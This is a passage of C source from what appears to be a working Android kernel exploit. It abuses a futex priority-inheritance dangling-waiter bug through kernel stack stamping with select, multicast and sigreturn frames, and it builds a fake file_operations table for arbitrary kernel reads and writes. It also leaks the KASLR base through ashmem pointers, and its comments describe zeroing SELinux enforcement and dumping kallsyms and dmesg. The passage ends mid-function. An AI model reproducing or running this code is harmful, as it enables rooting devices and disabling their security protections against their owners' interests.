      if (v != 1 && ++vs_retries < VS_MAX_RECLAIM_RETRIES) {
        /* Sweep candidate table offsets (leaked 16K page -> table delta):
         * the IonStack -0xe80 (+0x100 effective) may be wrong on CPH —
         * try each piece/chunk relationship across retries; persist the
         * sweep index so the next fire continues where this one stopped. */
        static const long xs[] = {0x100, 0xF80, -0x80, -0x1080,
                                  -0x2080, -0x3080, -0x7080, -0xB080};
        int xi = vs_x_idx_load();
        if (xi >= (int)(sizeof(xs) / sizeof(xs[0]))) xi = 0;
        long x = xs[xi];
        vs_x_idx_store(xi + 1);
        pr_info("VERIFY_SWAP reclaim lost — retry %d/%d with table X=%+ld "
                "(sweep idx %d)\n", vs_retries, VS_MAX_RECLAIM_RETRIES, x, xi);
        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
        if (page_base && fake_lock && fake_fops) {
          fake_fops = page_base + (uintptr_t)x;
          binwrite_target = fake_fops + 0x700;
          pr_info("VERIFY_SWAP X applied fake_fops=%016zx "
                  "binwrite=%016zx\n", fake_fops, binwrite_target);
          route_attempt = 0; /* for-loop ++ → re-run as phase 1 */
          continue;
        }
        pr_error("VERIFY_SWAP retry page prepare failed\n");
        cfi_last_step = 41;
        break;
      }
      if (v != 1) {
        durable_proof_log("vs_reclaim_exhausted_ABORT");
        cfi_last_step = 40;
        cfi_last_errno = v;
        break;
      }
    }

    if (sc || vs || chain || zion || zi || wion || zio || pad3) {
      char cbuf[160];
      const char *tag = vs ? "VS"
                           : (pad3 ? "PAD3"
                                  : (zio ? "ZIO"
                                         : (wion ? "WION"
                                                 : (zi ? "ZI"
                                                       : (zion ? "ZION"
                                                               : "CHAIN")))));
      snprintf(cbuf, sizeof(cbuf),
               "%s_phase=%d success=%d calls=%d cfi_step=%d cfi_errno=%d "
               "cfi_wr=%zd",
               tag, route_attempt, success, calls, cfi_last_step, cfi_last_errno,
               cfi_write_ret);
      live_sync_log(tag, cbuf);
    }
    if (zio && route_attempt == 1 && success > 0) {
      live_sync_log("ZIO", "phase1_ZERO_NAME_ok");
      continue;
    }
    if (zio && route_attempt == 1 && success <= 0) {
      live_sync_log("ZIO", "phase1_ZERO_NAME_FAIL");
      break;
    }
    if (zio && route_attempt == 2 && success > 0) {
      live_sync_log("ZIO", "phase2_ZERO_OWNER_ok_next_ION");
      continue;
    }
    if (zio && route_attempt == 2 && success <= 0) {
      live_sync_log("ZIO", "phase2_ZERO_OWNER_FAIL");
      break;
    }
    if (zio && route_attempt == 3) {
      char ibuf[128];
      snprintf(ibuf, sizeof(ibuf),
               "phase3_ION success=%d cfi_step=%d cfi_errno=%d wr=%zd",
               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
      live_sync_log("ZIO", ibuf);
      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
        live_sync_log("ZIO", "FOPS_CFI_HIT");
    }
    if (wion && route_attempt == 1 && success > 0) {
      live_sync_log("WION", "phase1_WAITLOCK0_ok_next_ION");
      durable_proof_log("wion_waitlock0_done");
      pr_info("MODE4_WION phase1 WAITLOCK0 done success=%d → ION_SAFE\n",
              success);
      continue;
    }
    if (wion && route_attempt == 1 && success <= 0) {
      live_sync_log("WION", "phase1_WAITLOCK0_FAIL_stop");
      pr_warning("MODE4_WION phase1 WAITLOCK0 no walk — stop\n");
      break;
    }
    if (wion && route_attempt == 2) {
      char ibuf[128];
      snprintf(ibuf, sizeof(ibuf),
               "phase2_ION success=%d cfi_step=%d cfi_errno=%d wr=%zd",
               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
      live_sync_log("WION", ibuf);
      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
        live_sync_log("WION", "FOPS_CFI_HIT");
    }
    if (zi && route_attempt == 1 && success > 0) {
      live_sync_log("ZI", "phase1_ZERO_NAME_ok_next_ION");
      durable_proof_log("zi_zero_name_done");
      pr_info("MODE4_ZI phase1 ZERO_NAME done success=%d → ION_SAFE\n", success);
      continue;
    }
    if (zi && route_attempt == 1 && success <= 0) {
      live_sync_log("ZI", "phase1_ZERO_FAIL_stop");
      pr_warning("MODE4_ZI phase1 ZERO_NAME no walk — stop\n");
      break;
    }
    if (zi && route_attempt == 2) {
      char ibuf[128];
      snprintf(ibuf, sizeof(ibuf),
               "phase2_ION success=%d cfi_step=%d cfi_errno=%d wr=%zd",
               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
      live_sync_log("ZI", ibuf);
      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
        live_sync_log("ZI", "FOPS_CFI_HIT");
    }
    if (pad3 && route_attempt == 1 && success > 0) {
      live_sync_log("PAD3", "phase1_MISC_p16_ok");
      continue;
    }
    if (pad3 && route_attempt == 1 && success <= 0) {
      live_sync_log("PAD3", "phase1_FAIL_stop");
      pr_warning("MODE4_PAD3 phase1 fail — stop\n");
      break;
    }
    if (pad3 && route_attempt == 2 && success > 0) {
      live_sync_log("PAD3", "phase2_MISC_p8_ok_next_FOPS");
      continue;
    }
    if (pad3 && route_attempt == 2 && success <= 0) {
      live_sync_log("PAD3", "phase2_FAIL_stop");
      pr_warning("MODE4_PAD3 phase2 fail — stop\n");
      break;
    }
    if (pad3 && route_attempt == 3) {
      char ibuf[128];
      snprintf(ibuf, sizeof(ibuf),
               "phase3_FOPS success=%d cfi_step=%d cfi_errno=%d wr=%zd",
               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
      live_sync_log("PAD3", ibuf);
      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
        live_sync_log("PAD3", "FOPS_CFI_HIT");
    }
    if (zion && route_attempt == 1 && success > 0) {
      durable_proof_log("zion_name0_done");
      live_sync_log("ZION", "phase1_NAME0_ok_next_ION");
      pr_info("MODE4_ZION phase1 NAME0 done success=%d → ION\n", success);
      continue;
    }
    if (zion && route_attempt == 1 && success <= 0) {
      live_sync_log("ZION", "phase1_NAME0_FAIL_stop");
      pr_warning("MODE4_ZION phase1 NAME0 no walk — stop\n");
      break;
    }
    if (zion && route_attempt == 2) {
      char ibuf[128];
      snprintf(ibuf, sizeof(ibuf),
               "phase2_ION_done success=%d cfi_step=%d cfi_errno=%d wr=%zd",
               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
      live_sync_log("ZION", ibuf);
      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
        live_sync_log("ZION", "ION_CFI_HIT_possible_fops_swap");
    }
    if (chain && route_attempt == 1 && success > 0) {
      durable_proof_log("chain_zero_name_done");
      live_sync_log("CHAIN", "phase1_ZERO_NAME_ok_next_ZERO_OWNER");
      pr_info("MODE4_CHAIN phase1 ZERO_NAME done success=%d cfi_step=%d "
              "→ ZERO_OWNER\n",
              success, cfi_last_step);
      continue; /* phase2 even if cfi22 */
    }
    if (chain && route_attempt == 1 && success <= 0) {
      live_sync_log("CHAIN", "phase1_ZERO_NAME_FAIL_stop");
      pr_warning("MODE4_CHAIN phase1 ZERO_NAME no walk success — stop before ION\n");
      break;
    }
    if (chain && route_attempt == 2 && success > 0) {
      durable_proof_log("chain_zero_owner_done_next_ion");
      live_sync_log("CHAIN", "phase2_ZERO_OWNER_ok_next_ION_SAFE");
      pr_info("MODE4_CHAIN phase2 ZERO_OWNER done success=%d cfi_step=%d "
              "→ ION_SAFE\n",
              success, cfi_last_step);
      continue; /* phase3 even if cfi22 */
    }
    if (chain && route_attempt == 2 && success <= 0) {
      live_sync_log("CHAIN", "phase2_ZERO_OWNER_FAIL_stop");
      pr_warning("MODE4_CHAIN phase2 ZERO_OWNER no walk — stop before ION\n");
      break;
    }
    if (chain && route_attempt == 3) {
      char ibuf[128];
      snprintf(ibuf, sizeof(ibuf),
               "phase3_ION_done success=%d cfi_step=%d cfi_errno=%d wr=%zd",
               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
      live_sync_log("CHAIN", ibuf);
      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
        live_sync_log("CHAIN", "phase3_ION_CFI_HIT_possible_fops_swap");
    }
    if (route_quality_miss) {
      continue;
    }
    /* STATIC_CHAIN: every phase's walk IS the goal — continue through the
     * final swap phase regardless of intermediate probe outcomes. */
    if ((sc || env_flag("MODE4_SC_DIAG", 0) ||
         env_flag("MODE4_SC_UMASK", 0)) && route_attempt < max_att) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, max_att, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

/* ------------------------------------------------------------------ */
/* MODE4_SELFSTAMP — Quest3-style continuous self-stamping route.      */
/*                                                                     */
/* The single-blocking-pselect design left a 5-50ms window after the   */
/* WRPI timeout during which the dangling pi_blocked_on pointed at an  */
/* UNSTAMPED stack residue (a live boot's kernel walk in that window   */
/* crashes on the stale residue). Here the waiter instead RE-STAMPS    */
/* its own kernel stack in a tight pselect(timeout=0) loop, starting   */
/* microseconds after the WRPI return, and the consumer fires into a  */
/* continuously refreshed stamp. All fd setup is PRE-STAGED before the */
/* WRPI call so the post-timeout path is pure syscall entries.         */
/* ------------------------------------------------------------------ */
static int ss_pipefd[2] = {-1, -1};
static int ss_block_fd = -1;
static int ss_high_read = -1;

int selfstamp_prestage(void) {
  if (pipe(ss_pipefd) != 0)
    return -1;
  ss_block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (ss_block_fd < 0)
    ss_block_fd = ss_pipefd[0];
  ss_high_read = fcntl(ss_block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
  if (ss_high_read < 0)
    return -1;
  /* OPEN_ALL policy: every fd in [0, NFDS) dup'd so ANY stamp bit
   * pattern is valid for select (no EBADF short-circuits). stdout is
   * saved and restored so console logging survives the fd sweep. */
  int saved_out = dup(1);
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++)
    dup2(ss_high_read, fd);
  if (saved_out >= 0) {
    dup2(saved_out, 1);
    close(saved_out);
  }
  pr_info("SELFSTAMP prestage ok: all %d fds open (pipe/timerfd dup)\n",
          PSELECT_ROUTE_NFDS);
  return 0;
}

#define SYS_syslog 116

static void fpsimd_nop_handler(int sig) { (void)sig; }

static void ss_flow(const char *m) {
  if (!env_flag("FLOW_LOG", 0))
    return; /* ungated file writes from the waiter clobber the stamp region
             * (same class as the harvester bug fixed earlier) */
  int f = open("/data/local/tmp/flow", O_WRONLY | O_CREAT | O_APPEND | O_SYNC,
               0644);
  if (f >= 0) {
    (void)write(f, m, strlen(m));
    (void)write(f, "\n", 1);
    close(f);
  }
}

void selfstamp_route(void) {
  { int tf = open("/data/local/tmp/flow", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (tf >= 0) { write(tf, "ROUTE_ENTER\n", 12); close(tf); } }
  ss_flow("ss_route_enter");
  if (!page_base || !fake_lock || !fake_fops) {
    pr_error("selfstamp route missing kernel page\n");
    return;
  }
  int sc = env_flag("MODE4_STATIC_CHAIN", 0);
  int max_ph = env_flag("MODE4_SC_UMASK", 0) ? 3
             : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : 2));
  /* SELFSTAMP_SINGLE=N: run ONLY phase N this fire (one walk per boot —
   * multi-phase interference crashes phase 2's stamp window). The next
   * fire on the SAME boot creates a fresh dangling for the next phase. */
  int single = env_int_range("SELFSTAMP_SINGLE", 0, 0, 8);
  int ph_start = single ? single : 1;
  int ph_end = single ? single : max_ph;
  struct timeval tv0 = {0, 0};
  for (int ph = ph_start; ph <= ph_end; ph++) {
    g_mode4_chain_phase = ph;
    fd_set in, out, ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    /* arm the consumer for this phase (its 50ms delay elapses while
     * the stamp below is being continuously refreshed) */
    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
    /* SP MEASUREMENT (QEMU_INIT): block 200ms in a real select so
     * /proc/<tid>/syscall exposes the select-path kernel SP; the MAIN
     * thread reads and prints it (its stdout works). Comparing with the
     * panic-dumped waiter address gives the exact fdset-waiter delta. */
    if (env_flag("QEMU_INIT", 0) && ph == ph_start) {
      {
        extern atomic_int ss_measure_go;
        atomic_store(&ss_measure_go, 1);
        struct timeval tv200 = {0, 200000};
        select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv200);
        atomic_store(&ss_measure_go, 0);
      }
    }
    atomic_store(&punch_consume_go, ph);
    ss_flow("ss_phase_armed");
    durable_proof_log("ss_phase_armed");
    if (env_flag("QEMU_INIT", 0)) {
      /* /proc/<tid>/syscall exposes the waiter's kernel SP while blocked
       * in select — lets userspace compute the fdset-vs-rt_waiter delta. */
      char pp[96], sb[256] = {0};
      snprintf(pp, sizeof(pp), "/proc/self/task/%d/syscall",
               (int)atomic_load(&waiter_tid));
      read_first_line(pp, sb, sizeof(sb));
      pr_info("QEMU_WAITER_SYSCALL=[%.200s]\n", sb);
      snprintf(pp, sizeof(pp), "/proc/self/task/%d/stat",
               (int)atomic_load(&waiter_tid));
      read_first_line(pp, sb, sizeof(sb));
      pr_info("QEMU_WAITER_STAT_TAIL=[%.120s]\n",
              sb + (strlen(sb) > 120 ? strlen(sb) - 120 : 0));
    }
    if (ph == 1 && !env_flag("SELFSTAMP_NOUNLOCK", 0)) {
      /* MID-STAMP unlock (Quest3 Step-3 repositioned): the first select
       * below places the stamp, THEN we release f_pi_chain — the
       * unlock's deboost walk reads our stamped words (not the raw
       * residue) and preserves the dangling for the consumer's walk. */
      select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
      futex_op(f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
      durable_proof_log("ss_midstamp_unlock");
    }
    /*
     * Deterministic handoff: stamp-spin for ~delay-10ms, one FINAL
     * stamp, then go QUIESCENT (vDSO clock + sched_yield only — no
     * deep syscalls) so the consumer's walk reads a STABLE stamp and
     * the walk's own writes to these words (rb_link_node) cannot be
     * torn by a concurrent fdset re-copy.
     */
    struct timespec ts0;
    clock_gettime(CLOCK_MONOTONIC, &ts0);
    long spin_us = (main_route_delay_usec > 20000)
                       ? (atomic_load(&main_route_delay_usec) - 10000L)
                       : 10000L;
    for (;;) {
      select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
      struct timespec tsn;
      clock_gettime(CLOCK_MONOTONIC, &tsn);
      long el = (tsn.tv_sec - ts0.tv_sec) * 1000000L +
                (tsn.tv_nsec - ts0.tv_nsec) / 1000;
      if (el >= spin_us)
        break;
    }
    /*
     * QEMU-verified: a LONG BLOCKING select lets kernel IRQ entries
     * (which nest on the task stack) clobber the stamp region — the
     * consumer then reads FPSIMD junk at waiter->lock and panics.
     * Instead SPIN-STAMP through the punch: each select(tv=0) re-copies
     * the fdsets; the walk reads a stamp refreshed thousands of times
     * per second (tear window = the ~us copy, far safer than 100 Hz
     * IRQ clobber of a frozen stamp).
     */
    {
      struct timespec tq0;
      clock_gettime(CLOCK_MONOTONIC, &tq0);
      if (env_flag("MCAST_STAMP", 0)) {
        /* MCAST dual-stamp (opt-in — device A2/A3 crashes when it replaces
        * select coverage; QEMU measurement tool): 260B buffer, +0x34 tags
         * (Quest3 exp32 geometry) with 0xCAFE0000_0000_00ii family — lldb
         * dump decides which stamp family (DEAD=select / CAFE=MCAST) lands
         * on the waiter fields. */
        int mfd = socket(AF_INET6, SOCK_DGRAM, 0);
        static unsigned char mbuf[260];
        if (mfd >= 0 && !mbuf[0]) {
          for (int wi = 0; wi < 11; wi++) {
            uint64_t tv2 = 0xCAFE0000000000C0ULL + (uint64_t)(wi + 2);
            memcpy(mbuf + 0x34 + wi * 8, &tv2, 8);
          }
        }
        for (int mspin = 0; mspin < 4000 && mfd >= 0; mspin++) {
          setsockopt(mfd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, mbuf,
                     sizeof(mbuf));
          if (atomic_load(&consumer_success) >= 1)
            break;
        }
        if (mfd >= 0)
          close(mfd);
      }
      /* FPSIMD stamp: load v0-v7 with FEED tags, self-signal — the
       * sigframe FPSIMD save writes 128B of controlled data at the
       * signal-frame depth (DEEPER than syscall frames — the Samsung
       * 5.15 route). Interleave with select spin for dual coverage. */
{ int tf2 = open("/data/local/tmp/flow", O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (tf2 >= 0) { write(tf2, "BEFORE_SIGRET_CHECK\n", 20); close(tf2); } }
if (env_flag("SIGRET_STAMP", 0)) {
        static uint8_t *sframe = NULL;
        static uint64_t ret_pc_v, ret_sp_v;
        if (!sframe) {
          sframe = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
          if (sframe == MAP_FAILED) {
            pr_error("SIGRET mmap failed\n");
          } else {
            for (int i = 0; i < 4096 / 8; i++) {
              uint64_t tag = 0xFEED0000000000C0ULL | (uint64_t)(i + 2);
              memcpy(sframe + i * 8, &tag, 8);
            }
            uint32_t magic = 0x46508001;
            uint32_t fsize = 536;
            memcpy(sframe + 592, &magic, 4);
            memcpy(sframe + 596, &fsize, 4);
            uint64_t sm = 0;
            memcpy(sframe + 456, &sm, 8);
            uint64_t pst = 0;
            memcpy(sframe + 176 + 264, &pst, 8);
            pr_info("SIGRET frame=%p\n", sframe);
          }
        }
        if (sframe && sframe != MAP_FAILED) {
          /* return PC = the address of the "1:" label below */
          __asm__ volatile("adr %0, 1f" : "=r"(ret_pc_v));
          memcpy(sframe + 176 + 256, &ret_pc_v, 8);
          __asm__ volatile("mov %0, sp" : "=r"(ret_sp_v));
          memcpy(sframe + 176 + 248, &ret_sp_v, 8);
          __asm__ volatile(
              "mov x9, sp\n"
              "mov sp, %0\n"
              "mov x8, #119\n"
              "svc #0\n"
              "1:\n"
              "mov sp, x9\n"
              :
              : "r"(sframe)
              : "x8", "x9", "memory", "cc");
          { int sf = open("/data/local/tmp/flow", O_WRONLY | O_CREAT | O_APPEND, 0644); if (sf >= 0) { write(sf, "SIGRET_DONE\n", 11); close(sf); } }
          for (;;) {
            __asm__ volatile("yield" ::: "memory");
            if (atomic_load(&consumer_success) >= 1)
              break;
          }
        }
      }
      for (;;) {
        select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
        /* WAIT FOR THE WALK TO RETURN: consumer_success is set only AFTER
         * sched_setattr completes. Exiting at consumer_calls (set before
         * the call) stopped the stamp mid-walk; the waiter's subsequent
         * harvester/file syscalls then clobbered the fdset region while
         * the walk still read it — the mid-walk crash class. */
        if (atomic_load(&consumer_success) >= 1)
          break;

        struct timespec tqn;
        clock_gettime(CLOCK_MONOTONIC, &tqn);
        long el = (tqn.tv_sec - tq0.tv_sec) * 1000000L +
                  (tqn.tv_nsec - tq0.tv_nsec) / 1000;
        if (el >= 300000)
          break;
      }
    }
    /*
     * Dying-box harvester: the moment the walk starts, dump every
     * slide source with per-chunk fsync to /data/local/tmp (persists
     * across softboot). If the selinux/kptr zero landed, these open —
     * even a partial dump that survives the crash yields the slide.
     */
    {
      {
        char hn[80] = {0};
        read_first_line("/proc/sys/kernel/hostname", hn, sizeof(hn));
        /* bootid readback FIRST (fastest landing proof — the ph3 store
         * corrupts the live bootid string; read it before anything else
         * and persist: survives the system_server crash it causes). */
        {
          char bid[64] = {0};
          read_first_line("/proc/sys/kernel/random/boot_id", bid, sizeof(bid));
          int bf = open("/data/local/tmp/bootid_readback",
                        O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
          if (bf >= 0) {
            if (bid[0])
              (void)write(bf, bid, strlen(bid));
            close(bf);
          }
          char bl[96];
          snprintf(bl, sizeof(bl), "SS_BOOTID=[%.40s]", bid);
          live_sync_log("SS", bl);
        }
        int hf = open("/data/local/tmp/hostname_readback",
                      O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
        if (hf >= 0) {
          if (hn[0]) (void)write(hf, hn, strlen(hn));
          close(hf);
        }
        pr_info("SS_HOSTNAME=[%.60s]\n", hn);
      }
      /*
       * LOOPING harvester: the selinux zero-store lands ~50-300ms AFTER
       * the punch (mid-walk) — a single-shot read misses it. Retry the
       * sources every 10ms for up to 3s; the first successful kallsyms
       * open means PERMISSIVE LANDED and the dump captures the slide
       * even while the box dies around us (per-chunk O_SYNC).
       */
      const char *srcs[] = {"/proc/kallsyms", "/proc/iomem"};
      int landed_src = -1;
      /* 500ms settle: probing SELinux hooks WHILE the walk's qword store
       * lands can tear the selinux_state bools mid-read (ph1+loop crashed
       * 2/2; ph3+loop fine — the only interaction is our own opens). */
      usleep(500000);
      for (int rep = 0; rep < 250 && landed_src < 0; rep++) {
        int t0 = open(srcs[0], O_RDONLY | O_CLOEXEC);
        if (t0 >= 0) {
          close(t0);
          landed_src = rep;
          break;
        }
        usleep(10000);
      }
      if (landed_src >= 0) {
        char lm[64];
        snprintf(lm, sizeof(lm), "PERMISSIVE_LANDED rep=%d", landed_src);
        live_sync_log("SS", lm);
      }
      /*
       * ph8 path: klogctl (SYS_syslog action 3 = read_all) — works for
       * unprivileged tasks iff dmesg_restrict==0. Loop-retry like kallsyms;
       * on success dump the ring (contains the boot memory-layout print
       * with RAW .text) to a persistent file — the slide harvest.
       */
      {
        int got_dmesg = 0;
        static char dbuf[65536];
        for (int rep = 0; rep < 250 && !got_dmesg; rep++) {
          errno = 0;
          long n = syscall(SYS_syslog, 3, dbuf, sizeof(dbuf) - 1);
          if (n > 0) {
            dbuf[n < (long)sizeof(dbuf) - 1 ? n : (long)sizeof(dbuf) - 1] = 0;
            got_dmesg = 1;
            int df = open("/data/local/tmp/dmesg_readback",
                          O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
            if (df >= 0) {
              (void)write(df, dbuf, (size_t)n);
              close(df);
            }
            live_sync_log("SS", "DMESG_LANDED");
            break;
          }
          usleep(10000);
        }
      }
      for (size_t si = 0; si < 2 && landed_src >= 0; si++) {
        int in = open(srcs[si], O_RDONLY | O_CLOEXEC);
        if (in < 0)
          continue;
        char op[128];
        snprintf(op, sizeof(op), "/data/local/tmp/harvest_%zu.txt", si);
        int of = open(op, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
        if (of < 0) {
          close(in);
          continue;
        }
        char buf[4096];
        ssize_t rn;
        size_t total = 0;
        while (total < 2u * 1024 * 1024 &&
               (rn = read(in, buf, sizeof(buf))) > 0) {
          ssize_t wn = write(of, buf, (size_t)rn);
          if (wn <= 0)
            break;
          total += (size_t)wn;
        }
        close(of);
        close(in);
        pr_info("SELFSTAMP harvest %s -> %s (%zu bytes)\n",
                srcs[si], op, total);
      }
    }
    atomic_store(&punch_consume_go, 0);
    char b[64];
    snprintf(b, sizeof(b), "ss_phase_%d_done calls=%d", ph,
             atomic_load(&consumer_calls));
    durable_proof_log(b);
    pr_info("SELFSTAMP phase %d: calls=%d success=%d\n", ph,
            atomic_load(&consumer_calls), atomic_load(&consumer_success));
  }
  durable_proof_log("ss_route_complete");
}

int repair_fake_fops_llseek(int fd) {
  /* Prefer runtime CFI JT offset (CPH2521); fall back to target.h. */
  uint64_t llseek_off = (active_offsets && active_offsets->off_noop_llseek)
                            ? active_offsets->off_noop_llseek
                            : NOOP_LLSEEK_OFF;
  uint64_t llseek = text_addr(KIMAGE_TEXT_BASE + llseek_off);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

static uint64_t fops_runtime_off(uint64_t table_off, uint64_t fallback_off) {
  if (active_offsets && table_off)
    return table_off;
  return fallback_off;
}

static uintptr_t fops_runtime_text(uint64_t table_off, uint64_t fallback_off) {
  return text_addr(KIMAGE_TEXT_BASE + fops_runtime_off(table_off, fallback_off));
}

/* Image VA for a table field (multi-TU safe; never use target.h *_OFF alone). */
static uintptr_t fops_image_sym(uint64_t table_off, uint64_t fallback_off) {
  return KIMAGE_TEXT_BASE + fops_runtime_off(table_off, fallback_off);
}

static uintptr_t fops_data_sym(uint64_t table_off, uint64_t fallback_off) {
  return data_addr(fops_image_sym(table_off, fallback_off));
}

int refresh_fake_fops_text(int fd) {
  uint64_t a_ioctl = active_offsets ? active_offsets->off_ashmem_ioctl : 0;
  uint64_t a_compat = active_offsets ? active_offsets->off_ashmem_compat_ioctl : 0;
  uint64_t a_mmap = active_offsets ? active_offsets->off_ashmem_mmap : 0;
  uint64_t a_open = active_offsets ? active_offsets->off_ashmem_open : 0;
  uint64_t a_rel = active_offsets ? active_offsets->off_ashmem_release : 0;
  uint64_t a_fdinfo = active_offsets ? active_offsets->off_ashmem_show_fdinfo : 0;
  uint64_t a_cfg_r = active_offsets ? active_offsets->off_configfs_read_iter : 0;
  uint64_t a_cfg_w = active_offsets ? active_offsets->off_configfs_bin_write_iter : 0;
  uint64_t a_splice = active_offsets ? active_offsets->off_copy_splice_read : 0;

  struct fops_slot {
    size_t off;
    uint64_t value;
  };
#ifdef GHOSTLOCK_KERNEL_5_10
  struct fops_slot slots[] = {
    {FOPS_READ_OFF, fops_runtime_text(a_cfg_r, CONFIGFS_READ_ITER_OFF)},
    {FOPS_WRITE_OFF, fops_runtime_text(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)},
    {FOPS_IOCTL_OFF, fops_runtime_text(a_ioctl, ASHMEM_IOCTL_OFF)},
    {FOPS_COMPAT_IOCTL_OFF, fops_runtime_text(a_compat, ASHMEM_COMPAT_IOCTL_OFF)},
    {FOPS_MMAP_OFF, fops_runtime_text(a_mmap, ASHMEM_MMAP_OFF)},
    {FOPS_OPEN_OFF, fops_runtime_text(a_open, ASHMEM_OPEN_OFF)},
    {FOPS_RELEASE_OFF, fops_runtime_text(a_rel, ASHMEM_RELEASE_OFF)},
    {FOPS_SPLICE_READ_OFF, fops_runtime_text(a_splice, COPY_SPLICE_READ_OFF)},
    {FOPS_SHOW_FDINFO_OFF, fops_runtime_text(a_fdinfo, ASHMEM_SHOW_FDINFO_OFF)},
  };
#else
  struct fops_slot slots[] = {
    {FOPS_READ_ITER_OFF, fops_runtime_text(a_cfg_r, CONFIGFS_READ_ITER_OFF)},
    {FOPS_WRITE_ITER_OFF, fops_runtime_text(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)},
    {FOPS_IOCTL_OFF, fops_runtime_text(a_ioctl, ASHMEM_IOCTL_OFF)},
    {FOPS_COMPAT_IOCTL_OFF, fops_runtime_text(a_compat, ASHMEM_COMPAT_IOCTL_OFF)},
    {FOPS_MMAP_OFF, fops_runtime_text(a_mmap, ASHMEM_MMAP_OFF)},
    {FOPS_OPEN_OFF, fops_runtime_text(a_open, ASHMEM_OPEN_OFF)},
    {FOPS_RELEASE_OFF, fops_runtime_text(a_rel, ASHMEM_RELEASE_OFF)},
    {FOPS_SPLICE_READ_OFF, fops_runtime_text(a_splice, COPY_SPLICE_READ_OFF)},
    {FOPS_SHOW_FDINFO_OFF, fops_runtime_text(a_fdinfo, ASHMEM_SHOW_FDINFO_OFF)},
  };
#endif

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  uint64_t a_fops = active_offsets ? active_offsets->off_ashmem_fops : 0;
  uint64_t a_open = active_offsets ? active_offsets->off_ashmem_open : 0;
  uint64_t a_ioctl = active_offsets ? active_offsets->off_ashmem_ioctl : 0;
  uint64_t a_mmap = active_offsets ? active_offsets->off_ashmem_mmap : 0;
  uint64_t a_rel = active_offsets ? active_offsets->off_ashmem_release : 0;
  uint64_t a_fdinfo = active_offsets ? active_offsets->off_ashmem_show_fdinfo : 0;

  kaslr_fops_alias = fops_data_sym(a_fops, ASHMEM_FOPS_OFF);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  /* open_ptr is a CFI JT on CPH2521; open off must be JT off too */
  kaslr_base = kaslr_open_ptr - fops_runtime_off(a_open, ASHMEM_OPEN_OFF);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = fops_runtime_text(a_ioctl, ASHMEM_IOCTL_OFF);
  kaslr_expected_mmap = fops_runtime_text(a_mmap, ASHMEM_MMAP_OFF);
  kaslr_expected_release = fops_runtime_text(a_rel, ASHMEM_RELEASE_OFF);
